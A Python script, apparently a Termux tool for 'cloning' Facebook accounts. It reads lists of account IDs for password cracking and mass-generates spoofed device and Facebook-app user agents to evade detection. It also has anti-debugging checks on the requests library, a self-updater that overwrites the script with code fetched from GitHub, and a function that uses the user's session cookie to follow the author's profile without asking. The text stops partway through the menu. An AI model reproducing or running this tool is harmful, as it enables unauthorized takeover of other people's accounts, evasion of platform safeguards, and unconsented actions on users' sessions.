from os import path
import requests
import random
import uuid
import string
import hashlib
import json
from os import path
import bs4
from bs4 import BeautifulSoup as bsoup
from os import system as sm
from urllib.request import urlopen
import os
import base64
import zlib
import pip
import urllib
import urllib3
import platform
import math
import smtplib
import platform
import smtplib
from datetime import datetime
import math
import tqdm
import os
import base64
import zlib
import pip
import urllib
import aiohttp
import asyncio
import rich
import json
from rich.progress import Progress
from rich.text import Text
from rich import print as rprint
from rich.panel import Panel
from rich.console import Console
from time import sleep as sp

# colors
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
W = "\033[0m"


def check_update():
    global ip2
    latest_ver = requests.get(
        "https://raw.githubusercontent.com/secre159/axl/main/version.txt"
    ).text
    with open(".version", "r") as version:
        return True if float(version.read().strip("")) < float(latest_ver) else False


def update():
    latest_ver = requests.get(
        "https://raw.githubusercontent.com/secre159/axl/main/version.txt"
    ).text
    with open(".version", "w") as axczel:
        axczel.write(latest_ver)
    latest = requests.get(
        "https://raw.githubusercontent.com/secre159/axl/main/axczel.py"
    ).text
    with open("axczel.py", "w") as axczel:
        axczel.write(latest)


async def bypass():
    file = open(
        "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py",
        "r",
    )
    file2 = open(
        "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py",
        "r",
    )
    file3 = open(
        "/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py",
        "r",
    )
    data = file.read()
    sess = file2.read()
    approve = file3.read()
    keyword = "print(url)"
    keyword2 = "print(data)"
    if keyword in data or "echo" in data or "pprint" in data or "exec" in data:
        sm("clear")
        print(10 * "\n\033[1;31mBOBO BYPASS PA")
        print("\n\033[1;33mBYE BYE FILES AHAHAHHAHA")
        exit()
    elif (
        "https://pastebin.com/raw/zg0D9N7Y" in approve
        or "AXCZEL" in approve
        or "pprint" in approve
    ):
        print(10 * "Try hard bypassing my tool lol🤣🤣🤣🤣\n")
        exit()
    elif (
        keyword in sess
        or "exec" in sess
        or "rich" in sess
        or "echo" in sess
        or keyword2 in sess
        or "pprint" in sess
        or "print(headers)" in sess
        or "Console" in sess
        or "{data}" in sess
        or "{url}" in sess
        or "{headers}" in sess
        or "open" in sess
        or ".write" in sess
    ):
        sm("clear")
        print(20 * "\nCAPTURE DATA PA HAHAHAHAHA")
        print("\n\033[1;31mBYE BYE FILES")
        exit()
    else:
        print(f"{G} CHECKING UPDATE")
        sp(5)
        if check_update():
            print("{}UPDATE FOUND".format(Y))
            sm("pkg install espeak -y")
            sm('espeak -s 150 "UPDATE FOUND"')
            update()
            sys.exit("{}update done, now run python axczel.py".format(C))
        else:
            print(f"{G} UPDATED")
            sp(3)
            await sub()


try:
    import os
    import requests
    import json
    import time
    import re
    import random
    import sys
    import uuid
    import string
    import subprocess
    from string import *
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    print("\n Installing missing modules ...")
    os.system("pip install requests futures==2 > /dev/null")
    os.system("python axczel.py")
except:
    pass

header_grup = {
    "user-agent": "FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794"
}
head = {
    "User Agent : Davik/2.1.0 (Linux;U;Android 4.0.0;Infinix X682B Build/Build/QP1A.190711.020;wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1"
}
head = {
    "user-agent": "Davik/2.1.0 (Linux;U;Android 10;TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"
}
header_grup = {
    "user-agent": "Mozilla/5.0 (Linux;Android 10;Mi 9T Pro Build/QKQ1.190825.002;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
}
header_grup = {
    "user-agent": "Mozilla/5.0 (Linux;Android 10;TECNO LC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
}
api = {
    "user-agent": "Mozilla/5.0 (Linux;Android 4.4.4;en-au;SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/107.0.0.0 Mobile Safari/537.36",
    "referer": "https://www.facebook.com/",
    "host": "business.facebook.com",
    "origin": "https://business.facebook.com",
    "upgrade-insecure-requests": "1",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7",
    "cache-control": "max-age=0",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8",
    "content-type": "text/html;charset=utf-8",
}
xx = []
user_agent = [
    "Mozilla/5.0 (Linux;Android 7.0;Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 7.0;Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 7.0;Redmi Note 4 Build/NRD90M;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]",
    "Mozilla/5.0 (Linux;Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 7.0;Redmi Note 4 Build/NRD90M;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]",
    "Mozilla/5.0 (Linux;Android 12;SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux;Android 12;LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36",
]
xx.append(user_agent)
uas_bawaan = "Mozilla/5.0 (Linux;Android 10;Mi 9T Pro Build/QKQ1.190825.002;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java;U;kau;nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux;Android 12;Nokia X20 Build/SKQ1.210821.001;wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux;Android 4.1.2;Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux;Android 12;SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux;U;Android 10;id-id;Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux;Android 4.1.2;Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11;Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux;Android 8.1.0;SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux;Android 7.0;Redmi Note 4X Build/MiUI MS;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0;480dpi;1080x1920;Xiaomi/xiaomi;Redmi Note 4X;mido;qcom;ru_RU;99640911)"
uas_random = random.choice(
    [
        "Mozilla/5.0 (Linux;U;Android 4.4.2;zh-CN;HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
        "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "Mozilla/5.0 (Linux;Android 10;Nokia 5.1 Plus Build/QP1A.190711.020;wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux;Android 12;SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
    ]
)
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone;CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux;Android 10;Nokia 5.1 Plus Build/QP1A.190711.020;wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(
    [
        "Mozilla/5.0 (Linux;Android 10;Mi 9T Pro Build/QKQ1.190825.002;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Linux;Android 4.4.4;en-au;SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux;Android 4.1.2;Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "Mozilla/5.0 (Linux;U;Android 4.4.2;zh-CN;HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux;Android 10;M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux;Android 7.0;SM-G930VC Build/NRD90M;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
    ]
)
ugen = []
ua2 = []
uap = []
for uaa in range(random.randrange(30000, 99999)):
    x = (
        "[FBAN/FB4A;FBAV/"
        + str(random.randrange(11, 300))
        + ".0.0"
        + str(random.randint(9, 49))
        + "."
        + str(random.randrange(11, 313))
        + ";FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    )
    ua2.append(x)
mn = []
gt = []
xmc = open("dev.json", "r").read()
bnb = json.loads(xmc)
for bnnb in bnb:
    if "SM-" in bnnb["model"] or "Redmi" in bnnb["model"] or "CPH" in bnnb["model"]:
        gt.append(bnnb["model"])
for bnbm in bnb:
    if (
        "GT-" in bnbm["model"]
        or "RMX" in bnbm["model"]
        or "SM-" in bnbm["model"]
        or "itel" in bnbm["model"]
        or "TECNO" in bnbm["model"]
        or "M200" in bnbm["model"]
        or "CPH" in bnbm["model"]
        or "ZTE" in bnbm["model"]
        or "moto" in bnbm["model"]
        or "Huawei" in bnbm["model"]
        or "HUAWEI" in bnbm["model"]
        or "Redmi" in bnbm["model"]
    ):
        mn.append(bnbm["model"])
    # if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "OPPO" in bnbm['model'] or "SM-" in bnbm['model'] or "CPH" in bnbm['model'] or "LG" in bnbm['model'] or "M200" in bnbm['model'] or "vivo" in bnbm['model'] or "Lenovo" in bnbm['model'] or "motorola" in bnbm['model'] or 'SAMSUNG' in bnbm['model'] or "SAMSUNG" in bnbm['model'] or "ASUS" in bnbm['model'] or "MI " in bnbm['model'] or "Infinix" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model']:
    # mn.append(bnbm['model'])
for agent in range(random.randrange(80000, 99999)):
    aa = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)};{random.choice(['','',' en-us;',' en-US;',' en-ph;',' en-PH;','',''])}"
    # b=random.randint(6,12)
    modelsss = random.choice(mn)
    qp1a = f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}"
    fff = f" Build/{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
    ranbuild = random.choice([qp1a, fff, "", ""])
    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
    h = random.randrange(90, 117)
    i = "0"
    j = random.randrange(4000, 6000)
    k = random.randrange(30, 150)
    l = "Mobile Safari/537.36"
    n = f"[FB_IAB/{random.choice(['FB4A','MESSENGER','Orca-Android'])};FBAV/{random.randint(80,410)}.0.0.{random.randint(10,25)}.{random.randint(100,300)};]"
    m = f"[FBAN/{random.choice(['EMA'])};FBLC/en_US;FBAV/{random.randint(80,410)}.0.0.{random.randint(10,30)}.{random.randint(100,200)};]"
    o = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) Gecko/114.0 Firefox/{random.randint(60,122)}{random.choice(['.0','.1'])}"
    p = f"OPR/{random.randint(60,68)}.0.{random.randint(3000,3500)}.{random.randint(10000,65000)}"
    pp = f"XiaoMi/MiuiBrowser/{random.randint(7,16)}.{random.randint(1,9)}.{random.randint(1,15)}"
    ppp = f"XiaoMi/Mint Browser/{random.randint(1,3)}.{random.randint(1,9)}.{random.randint(0,3)}"
    phonix = f"PHX/{random.randint(1,14)}.{random.randint(1,9)}"
    fireff = f"Firefox/{random.randint(60,122)}{random.choice(['.1','.0'])}"
    q = random.choice([n, m, p, pp, ppp, phonix, fireff, ""])
    samsungg = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{random.randint(10,24)}.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36"
    ucbrowser = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 UCBrowser/{random.randint(11,13)}.{random.randint(1,6)}.{random.randrange(1,4)}.{random.randint(950,1500)}"
    edgee = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(90,117)}.0.{random.randint(4000,9000)}.{random.randint(30,150)} Mobile Safari/537.36 EdgA/{random.randint(90,117)}.0.{random.randint(1000,9999)}.{random.randint(30,150)}"
    huaweiii = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} HuaweiBrowser/{random.randint(10,15)}.0.{random.randint(1,9)}.{random.randint(250,310)} Mobile Safari/537.36"
    viboo = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {modelsss}{ranbuild}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 VivoBrowser/{random.randint(9,18)}.{random.randint(0,1)}.{random.randint(0,99)}.{random.randint(0,4)}"
    fullagent = f"{aa} {modelsss}{ranbuild}) {g}{h}.{i}.{j}.{k} {l} {q}"
    fullyage = random.choice([fullagent, samsungg, o, huaweiii])
    ugen.append(fullyage)

    # [FBAN/FB4A;FBAV/{random.randrange(100,200)}.0.0.{random.randint(10,35)}).{random.randint(77,150)};'+'FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/VIVO;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]')
    # '[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606708;FBDM/{density=1.5,width=480,height=903};FBLC/en_PH;FBRV/314177058;FBCR/GLOBE;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A600F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]')

    # +str(random.randrange(0,8))+"."+str(random.randrange(0,9)))
    # XiaoMi/MiuiBrowser/11.5.12')
    # +"[FBAN/FB4A;FBAV/"+str(random.randint(11,100))+".0.0."+str(random.randint(9,49))+"."+str(random.randint(11,313)))
    # +";FBBV/"+str(random.randint(300000000,500000000))+";FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/"+str(random.randint(300000000,500000000))+";FBCR/Verizon;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/2201123G;FBSV/"+str(random.randint(7,12))+";FBOP/1;FBCA/arm64-v8a:;]")
    # "[FB_IAB/FB4A;FBAV/329.0.0.29.120;]")
    # "[FBAN/FB4A;FBAV/400.0.0.37.76;FBBV/"+str(random.randrange(400000000,500000000))+";FBDM/{density=2.8125,width=1080,height=2131};FBLC/en_US;FBRV/"+str(random.randrange(400000000,500000000))+";FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S906E;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]


def date(ids):
    if len(ids) == 15:
        if ids[:10] in ["1000000000"]:
            creation = "\033[1;33m2009"
        elif ids[:9] in ["100000000"]:
            creation = "\033[1;33m2009"
        elif ids[:8] in ["10000000"]:
            creation = "\033[1;33m2009"
        elif ids[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            creation = "\033[1;33m2009"
        elif ids[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            creation = "\033[1;33m2010"
        elif ids[:6] in ["100001"]:
            creation = "\033[1;33m2010\033[0m/\033[1;33m2011"
        elif ids[:6] in ["100002", "100003"]:
            creation = "\033[1;33m2011\033[0m/\033[1;33m2012"
        elif ids[:6] in ["100004"]:
            creation = "\033[1;33m2012\033[0m/\033[1;33m2013"
        elif ids[:6] in ["100005", "100006"]:
            creation = "\033[1;33m2013\033[0m/\033[1;33m2014"
        elif ids[:6] in ["100007", "100008"]:
            creation = "\033[1;33m2014/2015[/]"
        elif ids[:6] in ["100009"]:
            creation = "\033[1;33m2015"
        elif ids[:5] in ["10001"]:
            creation = "\033[1;33m2015\033[0m/\033[1;33m2016"
        elif ids[:5] in ["10002"]:
            creation = "\033[1;33m2016\033[0m/\033[1;33m2017"
        elif ids[:5] in ["10003"]:
            creation = "\033[1;33m2018\033[0m/\033[1;33m2019"
        elif ids[:5] in ["10004"]:
            creation = "\033[1;33m2019\033[0m/\033[1;33m2020"
        elif ids[:5] in ["10005"]:
            creation = "\033[1;33m2020"
        elif ids[:5] in ["10006", "10007"]:
            creation = "\033[1;33m2021"
        elif ids[:5] in ["10008"]:
            creation = "\033[1;33m2022"
        else:
            creation = "\033[1;33m2023"
    elif len(ids) in [9, 10]:
        creation = "\033[1;33m2008/2009"
    elif len(ids) == 8:
        creation = "\033[1;33m2007/2008"
    elif len(ids) == 7:
        creation = "\033[1;33m2006/2007"
    else:
        creation = "\033[1;33m2023"
    return creation


def follow(po, coki):
    po.headers.update(
        {
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://mbasic.facebook.com/profile.php?id=axczel.xhan",
        }
    )
    r = po.get(
        "https://mbasic.facebook.com/profile.php?id=axczel.xhan",
        cookies={"cookie": coki},
    )
    soup = bsoup(r.content, "html.parser")
    follow_link = soup.find("a", string="Follow").get("href")
    po.get("https://mbasic.facebook.com" +
           follow_link, cookies={"cookie": coki})


sim_id = ""
android_version = (
    subprocess.check_output("getprop ro.build.version.release", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
model = (
    subprocess.check_output("getprop ro.product.model", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
build = (
    subprocess.check_output("getprop ro.build.id", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
fblc = "en_GB"
try:
    fbcr = (
        subprocess.check_output("getprop gsm.operator.alpha", shell=True)
        .decode("utf-8")
        .split(",")[0]
        .replace("\n", "")
    )
except:
    fbcr = "Zong"
fbmf = (
    subprocess.check_output("getprop ro.product.manufacturer", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
fbbd = (
    subprocess.check_output("getprop ro.product.brand", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
fbdv = model
fbsv = android_version
fbca = (
    subprocess.check_output("getprop ro.product.cpu.abilist", shell=True)
    .decode("utf-8")
    .replace(",", ":")
    .replace("\n", "")
)
fbdm = (
    "{density=2.25,height="
    + subprocess.check_output("getprop ro.hwui.text_large_cache_height", shell=True)
    .decode("utf-8")
    .replace("\n", "")
    + ",width="
    + subprocess.check_output("getprop ro.hwui.text_large_cache_width", shell=True)
    .decode("utf-8")
    .replace("\n", "")
)
try:
    fbcr = (
        subprocess.check_output("getprop gsm.operator.alpha", shell=True)
        .decode("utf-8")
        .split(",")
    )
    total = 0
    for i in fbcr:
        total += 1
    select = ("1", "2")
    if select == "1":
        fbcr = (
            subprocess.check_output("getprop gsm.operator.alpha", shell=True)
            .decode("utf-8")
            .split(",")[0]
            .replace("\n", "")
        )
        sim_id += fbcr
    elif select == "2":
        try:
            fbcr = (
                subprocess.check_output(
                    "getprop gsm.operator.alpha", shell=True)
                .decode("utf-8")
                .split(",")[1]
                .replace("\n", "")
            )
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = "Zong"
        sim_id += fbcr
except:
    fbcr = "Zong"


ah = "Axczel-"
imt = "-M4786=="
ak = " SECRE-"
myid = uuid.uuid4().hex[:10].upper()

try:
    key1 = open("/data/data/com.termux/files/usr/bin/.AXCZEL -cov", "r").read()
except:
    kok = open("/data/data/com.termux/files/usr/bin/.AXCZEL -cov", "w")
    kok.write(myid + imt)
    kok.close()
device = {
    "android_version": android_version,
    "model": model,
    "build": build,
    "fblc": fblc,
    "fbmf": fbmf,
    "fbbd": fbbd,
    "fbdv": model,
    "fbsv": fbsv,
    "fbca": fbca,
    "fbdm": fbdm,
}
sm("clear")
# ip1 = requests.get('https://api.ipify.org/')
ip2 = "127.0.0.1"
os.system("clear")
print("                YOUR IP: " + str(ip2))
time.sleep(3)
os.system("clear")
print("\033[1;31m")
version = open(".version", "r").read().strip()
logo = f"""\033[1;37m

              \033[1;33m
           ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
          ░▒▓████████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
          ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░                            
\033[1;32m{"═"*os.get_terminal_size().columns}
               \033[1;37m𓊈AUTHOR𓊉      :       \033[1;32m AXL
               \033[1;37m𓊈VERSION𓊉     :       \033[1;32m {version}
               \033[1;37m𓊈STATUS𓊉      :       \033[1;32m PERSONAL 
               \033[1;37m𓊈IP𓊉          :        \033[1;32m\033[1;36m{ip2}\033[1;32m
\033[1;32m{"═"*os.get_terminal_size().columns}"""


def linex():
    print("\033[1;32m═" * os.get_terminal_size().columns)


def clear():
    os.system("clear")
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
cok = []
id = []
tokenku = []


def menu():
    global fo
    try:
        clear()
        if 1 == 1:
            clear()
            print(f"{Y}[{C}1{Y}] {G}File Cloning\n{Y}[{C}0{Y}] {R}EXIT")
            linex()
            xd = input(" Choose an option: ")
            if xd in ["1", "01"]:
                clear()
                print(" Put file example:  /sdcard/File.txt  etc..")
                print(" Make sure file in your storage")
                linex()
                file = input(" Put file path\033[1;37m: ")
                try:
                    fo = open(file, "r").read().splitlines()
                except FileNotFoundError:
                    print(" File location not found ")
                    time.sleep(1)
                    menu()
                clear()
                print(" Try method 1 & 3 for best results  ")
                linex()
                print(
                    " [1] Method 1 (No Load) \n [2] Method 2 (STNT-GLOBE) \n [3] Method 3 (GTM)\n"
                )
                linex()
                mthd = input(" Choose: ")
                linex()
                plist = []
                print(" Select Password Crack menu")
                linex()
                print(
